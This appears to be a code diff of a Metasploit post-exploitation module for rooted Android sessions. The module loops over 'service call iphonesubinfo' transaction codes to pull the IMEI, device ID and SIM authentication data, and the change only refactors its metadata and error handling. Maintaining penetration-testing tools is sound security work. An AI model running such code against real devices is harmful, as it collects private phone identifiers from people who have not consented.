@@ -13,26 +13,26 @@ class MetasploitModule < Msf::Post
     super(
       update_info(
         info,
-        {
-          'Name' => 'extracts subscriber info from target device',
-          'Description' => %q{
-            This module displays the subscriber info stored on the target phone.
-            It uses call service to get values of each transaction code like imei etc.
-          },
-          'License' => MSF_LICENSE,
-          'Author' => ['Auxilus'],
-          'SessionTypes' => [ 'meterpreter', 'shell' ],
-          'Platform' => 'android'
+        'Name' => 'Extract Subscriber Info',
+        'Description' => %q{
+          This module displays the subscriber info stored on the target phone.
+          It uses call service to get values of each transaction code like IMEI, etc.
+        },
+        'License' => MSF_LICENSE,
+        'Author' => ['Auxilus'],
+        'SessionTypes' => [ 'meterpreter', 'shell' ],
+        'Platform' => 'android',
+        'Notes' => {
+          'Stability' => [CRASH_SAFE],
+          'SideEffects' => [],
+          'Reliability' => []
         }
       )
     )
   end
 
   def run
-    unless is_root?
-      print_error('This module requires root permissions.')
-      return
-    end
+    fail_with(Failure::NoAccess, 'This module requires root permissions.') unless is_root?
 
     @transaction_codes ||= [
       'DeviceId',
@@ -65,12 +65,10 @@ class MetasploitModule < Msf::Post
       'IsimChallengeResponse',
       'IccSimChallengeResponse'
     ]
-    values ||= []
     arr ||= []
     for code in 1..@transaction_codes.length do
       print_status("using code : #{code}")
-      cmd = "service call iphonesubinfo #{code}"
-      block = cmd_exec(cmd)
+      block = cmd_exec("service call iphonesubinfo #{code}")
       value, tc = get_val(block, code)
       arr << [tc, value]
     end
